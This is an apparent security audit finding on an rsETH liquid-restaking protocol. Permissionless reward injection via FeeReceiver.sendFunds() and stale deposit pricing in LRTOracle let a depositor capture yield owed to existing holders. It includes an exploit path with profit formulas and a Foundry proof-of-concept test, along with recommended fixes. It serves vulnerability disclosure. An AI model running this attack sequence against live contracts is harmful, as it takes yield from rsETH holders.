Audit Report

## Title
Permissionless `FeeReceiver.sendFunds()` Enables Attacker-Controlled Reward Injection Timing to Steal Yield from rsETH Holders — (`contracts/FeeReceiver.sol`, `contracts/LRTOracle.sol`)

## Summary
`FeeReceiver.sendFunds()` carries no access control, allowing any caller to inject accumulated MEV/EL rewards into `LRTDepositPool` at a time of their choosing. Because `LRTDepositPool.getRsETHAmountToMint()` prices deposits against the last *stored* `rsETHPrice` rather than a freshly computed value, an attacker can deposit at the pre-reward price, atomically trigger reward injection and a price update, and redeem after the withdrawal delay at the inflated price — capturing a pro-rata share of the reward they did not earn, at the direct expense of existing rsETH holders.

## Finding Description
**Root cause — permissionless reward injection with stale deposit pricing.**

`FeeReceiver.sendFunds()` has no role guard:
```solidity
// contracts/FeeReceiver.sol L53-58
function sendFunds() external {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
```

`LRTOracle.updateRSETHPrice()` is similarly open to any caller while unpaused:
```solidity
// contracts/LRTOracle.sol L87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

Deposits are priced against the last stored `rsETHPrice`, not a live computation:
```solidity
// contracts/LRTDepositPool.sol L520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**Exploit path:**

Let TVL = T, rsETH supply = S, stored price P = T/S, pending reward in `FeeReceiver` = R.

1. Attacker calls `depositETH{value: X}()` → minted rsETH = X/P; TVL becomes T+X, supply becomes S+X/P. Price is unchanged (deposit is fairly priced at P).
2. Attacker calls `FeeReceiver.sendFunds()` → R ETH moves into `LRTDepositPool`; TVL becomes T+X+R.
3. Attacker calls `LRTOracle.updateRSETHPrice()` → new stored price = (T+X+R)/(S+X/P) = P·(T+X+R)/(T+X) > P.
4. After `withdrawalDelayBlocks` (~8 days), attacker redeems (X/P) rsETH at the new price.

**Attacker profit** = (X/P)·P·(T+X+R)/(T+X) − X = X·R/(T+X).

This is exactly the yield stolen from existing holders: they receive T·R/(T+X) instead of R.

**Why existing guards are insufficient:**

The `pricePercentageLimit` check (LRTOracle.sol L252-266) only reverts if the price increase exceeds the configured threshold AND the caller lacks `MANAGER` role. It provides no protection when:
- `pricePercentageLimit == 0` (unset/default) — the check is entirely skipped (`pricePercentageLimit > 0` is false).
- The reward R is small enough that the price increase stays within the limit — the attack succeeds unconditionally and can be repeated many times.

## Impact Explanation
**High — Theft of unclaimed yield.** Every rsETH holder who held through the MEV reward accrual period loses a quantifiable fraction of their yield. The attacker's profit X·R/(T+X) is a direct transfer of yield from existing holders to the attacker, proportional to the attacker's deposit size and the reward amount. The impact is repeatable for every reward accumulation cycle.

## Likelihood Explanation
**High.** Both `sendFunds()` and `updateRSETHPrice()` are callable by any unprivileged EOA or contract. MEV/EL rewards accumulate continuously in `FeeReceiver`. The attack requires no privileged access, no oracle manipulation, no reentrancy, and no mempool racing — the attacker controls the entire three-step sequence atomically. The only partial mitigation (`pricePercentageLimit`) is bypassable when unset or when rewards are below the threshold. The withdrawal delay (~8 days) imposes an opportunity cost but does not prevent the attack.

## Recommendation
1. **Restrict `FeeReceiver.sendFunds()`** to a privileged role (e.g., `MANAGER` or `OPERATOR`) so that reward injection timing is controlled by the protocol, not arbitrary callers.
2. **Alternatively**, call `_updateRsETHPrice()` atomically inside `receiveFromRewardReceiver()` so that the price reflects the injected reward before any subsequent deposit can be priced against the stale value.
3. **Ensure `pricePercentageLimit` is always set** to a non-zero value as defense-in-depth; consider reverting initialization if it is zero.

## Proof of Concept
```solidity
// Foundry fork test (pseudocode)
function testMEVYieldTheft() public {
    // State: FeeReceiver holds 10 ETH of accumulated MEV rewards
    vm.deal(address(feeReceiver), 10 ether);

    uint256 priceBefore = lrtOracle.rsETHPrice();

    // Step 1: Attacker deposits 100 ETH at stale (pre-reward) price
    vm.prank(attacker);
    depositPool.depositETH{value: 100 ether}(0, "");
    uint256 attackerRsETH = rsETH.balanceOf(attacker);

    // Step 2: Attacker injects reward into TVL
    vm.prank(attacker);
    feeReceiver.sendFunds();

    // Step 3: Attacker triggers price update
    vm.prank(attacker);
    lrtOracle.updateRSETHPrice();

    uint256 priceAfter = lrtOracle.rsETHPrice();
    assertGt(priceAfter, priceBefore);

    // After withdrawal delay, attacker redeems at higher price
    uint256 attackerETHValue = attackerRsETH * priceAfter / 1e18;
    assertGt(attackerETHValue, 100 ether); // profit = attacker's share of the 10 ETH reward
}
```

The assertion holds for any non-zero `FeeReceiver` balance, as long as the price increase stays within `pricePercentageLimit` (or `pricePercentageLimit` is zero). The stolen amount equals `100 ether * 10 ether / (TVL + 100 ether)`.
